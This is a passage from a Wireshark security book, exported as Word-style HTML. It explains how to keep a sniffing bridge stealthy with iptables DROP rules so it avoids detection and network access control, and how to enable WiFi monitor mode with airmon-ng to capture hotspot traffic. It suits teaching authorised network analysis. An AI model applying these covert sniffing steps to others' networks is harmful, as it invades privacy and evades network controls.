New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.3000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >name</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >bridge</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.2000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >id</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >STP</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.2500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >enabled</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >interfaces </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >stpbr</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >8000.000000000000</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >yes</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >root@pickaxe:~# brctl stp stpbr off</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section157" ><p class=MsoNormal  style="margin-top:3.9500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >root@pickaxe:~#</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A cautionary note: A bridge interface generates traffic. Traffic originating from the bridge will have layer 2 (MAC) information in the IP header. Even when you don&#8217;t configure an IP address on the bridge, it can generate traffic in some cases. Unless you specifically configured your bridge to run in a &#8220;transparent&#8221; mode or &#8220;stealth&#8221; mode, your bridge&#8217;s MAC information will be used. This traffic not only gives away your presence on the network, but traffic with an unfamiliar MAC address might even disable the switchport if the settings are restrictive enough or if there is a form of Network Access Control (NAC) in place. A good way to prevent these problems is by filtering all traffic from the host going out the bridge entirely using </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >iptables</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The following </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >iptables </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >statements block all outgoing traffic originating from the host. This has to be done on the bridge interfaces as well because some kernel modules (like the IPv6 stack) generate traffic on all connected interfaces in an attempt to autoconfigure or because of multicast protocols.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.8500pt;margin-right:52.5000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >root@pickaxe:~# iptables -A OUTPUT -o stpbr -j DROP root@pickaxe:~# iptables -A OUTPUT -o eth1 -j DROP root@pickaxe:~# iptables -A OUTPUT -o eth2 -j DROP</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:10.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Remember that this disables your connection to the network if you are using the bridging interfaces for other purposes (like browsing the Internet). If it is essential for you to be stealthy, take extra care to disable IPv6 functions that try to automatically configure. It is best to disable IPv6 altogether in a sniffing setup because it is hard to limit the transmission of packets on an IPv6 interface that are related to the IP protocol itself.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.2000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Wireless Networks</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireless communications result in unique challenges to safeguard confidentiality. A cable gives at least some idea of the recipient. In the case of wireless communications, the recipient can be anywhere within a given radius. For this reason, there are multiple ways to secure the packets traveling through the airwaves. Some o<a name="_bookmark301" ></a>f these protocols have been broken, exposing the users of these deprecated protocols to</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section158" ><p class=MsoBodyText  style="margin-top:3.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >sniffing. Others choose to leave the WiFi Access Points unsecured for ease of access or to run a restaurant hotspot. The full scope of sniffing wireless networks is beyond this book, but this section gives you a primer on the possibilities when sniffing WiFi connections.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >WiFi sniffing on Windows is very challenging because WinPcap, the library used by Wireshark, does not support monitor mode, also called </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >rfmon mode </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >for wireless. If you need a monitor mode for Wireshark on Windows, you will need to change the driver, at a minimum. At the time of this writing, one possible driver option is Riverbed AirPcap. In general, getting wireless monitoring working in Wireshark is highly dependent on the version of Windows, Wireshark, the model of wireless adapter, and, of course, the driver. Therefore, this section focuses on sniffing wireless connections on Linux.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:15.0500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Unsecured WiFi</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:12.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Transmitting packets through an unsecured wireless connection is much like a shouting conversation across a city square: You can&#8217;t really blame people for listening in. The same applies to sniffing on a wireless link. All you need is a wireless network card that supports promiscuous mode to hear everything that is shouted across that busy caf&#233; hotspot.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Promiscuous mode for a wireless card is called </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >monitor mode </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >or </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >rfmon mode</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The easiest way to check if your wireless card supports this mode, and to enable it if it does, is the Aircrack-ng suite of tools. Go to </span><span><a href="http://www.aircrack-ng.org/doku.php?id=faq" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >http://www.aircrack-ng.org/doku.php?id=faq</span></u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);font-size:12.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >for up-to-date information. Currently, an expensive but known working option is the Alfa AWUS036H, a USB wireless card with high output that makes it ideally suited for sniffing and security applications.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Follow these steps to enable monitor mode on your wireless interface and analyze the packets with Wireshark:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.6000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l23 level1 lfo8;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-3.6000pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Connect the WiFi card. Make sure it is detected in </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dmesg</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.9000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >output.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  align=justify  style="margin-top:7.3500pt;margin-right:14.7000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:justify;text-justify:inter-ideograph;mso-list:l23 level1 lfo8;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-3.6000pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Disable all programs that might interfere with the card&#8217;s</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >operation (for example, dhclient and NetworkManager). Airmon-ng will also warn you about</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >this.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section159" ><p class=17  style="margin-top:3.8500pt;margin-right:23.3000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l23 level1 lfo8;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-3.6000pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Execute the following command: </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >airmon-ng </span><i><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-style:italic;font-size:12.0000pt;" >wlan0 </span></i><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >start </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(where </span><i><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-style:italic;font-size:12.0000pt;" >wlan0</span></i><i><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.3500pt;font-style:italic;font-size:12.0000pt;" >&nbsp;</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is the name of your supported wireless card). Note that you will have to run this command as</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >root.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.9000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l23 level1 lfo8;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-3.6000pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >4.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Airmon-ng creates a new interface called</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.5000pt;font-size:15.0000pt;" >&nbsp;</span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >mon0</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:43.4000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l23 level1 lfo8;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-3.6000pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >5.<span>&nbsp;</span></span></span><![endif]><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="429"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker209273.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Start Wireshark and select the new interface mon0 to sniff</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the packets in</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:5.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As shown in<a name="_bookmark303" ></a>&nbsp;</span><span><a href="#_bookmark304" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-16</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, Wireshark shows you all the raw packets it receives. In the case of unsecured WiFi connections, as used in public hotspots, this means you can see all the traffic if the signal quality is good enough.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section160" ><p class=MsoBodyText ><img width="780"  height="350"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker209618.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark304" ></a><span><a href="#_bookmark303" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-16:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Raw wireless packets in Wireshark</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Identifying base stations with airodump is also possible. Using the tool airodump is left outside the scope of this book, as there are several resources online.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The wireless card is tuned to a specific channel and you will only see packets that are transmitted in the frequency range belonging to that channel. The allowed channel numbers differ by region but are in the range of 1 to 14. To change the channel the card is listening to, use the following command:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >root@pickaxe:~# iwconfig channel 6</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="364"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker210199.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:8.5000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section161" ><p class=MsoBodyText  style="margin-left:13.2500pt;" ><span><span style="position:absolute;z-index:1;margin-left:0.0000px;margin-top:0.0000px;width:763.0000px;height:324.0000px;" ><img width="763"  height="324"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker210227.png" ></span></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:4.3500pt;" ><a name="Loading and Saving Capture Files" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark306" ></a>Loading and Saving Capture Files</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Viewing packets in the GUI using Wireshark or watching them scrolling by you in TShark is great. Sometimes, however, Wireshark isn&#8217;t the only tool you want to use for packet analysis. Packet captures can come from varying sources generated by different tools and saved to different formats. Wireshark supports both saving out to the common pcap formats and reading/saving various proprietary formats.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You cannot save a running capture, so in order to save your traffic, you need to stop the capture using the menu or by clicking the Stop button in the toolbar; otherwise, the Save button or menu options are grayed out. After stopping a running capture session, you can save it by selecting File </span><span style="mso-spacerun:'yes';font-family:'MS UI Gothic';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8680; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Save or pressing Ctrl+S. This presents a Save dialog box, where you can select the filename, destination path, and output format for the packet capture.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:9.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Likewise, there are very interesting packet captures available online for loading and analyzing. While most traces are kept at a minimal</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >size and common format, you might find a few needing extra</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.3000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >attention.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.0500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >File Formats</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Since Wireshark version 1.8, the default output format is PcapNG, a newer format being developed by WinPcap. PcapNG has support for</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section162" ><p class=MsoBodyText  style="margin-top:4.0000pt;margin-right:8.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >saving metadata in the capture file, such as comments; it also supports higher precision timestamps and name resolution. If you intend to view the capture with a different, much <a name="_bookmark307" ></a>older tool, you will want to save in the older pcap format to ensure compatibility. As shown in<a name="_bookmark308" ></a>&nbsp;</span><span><a href="#_bookmark309" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-17</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, Wireshark can support file formats for a wide range of tools.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="176.25"  height="0" ></td></tr><tr><td></td><td><img width="668"  height="438"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker211850.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark309" ></a><span><a href="#_bookmark308" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-17:</span></u></b><b><span 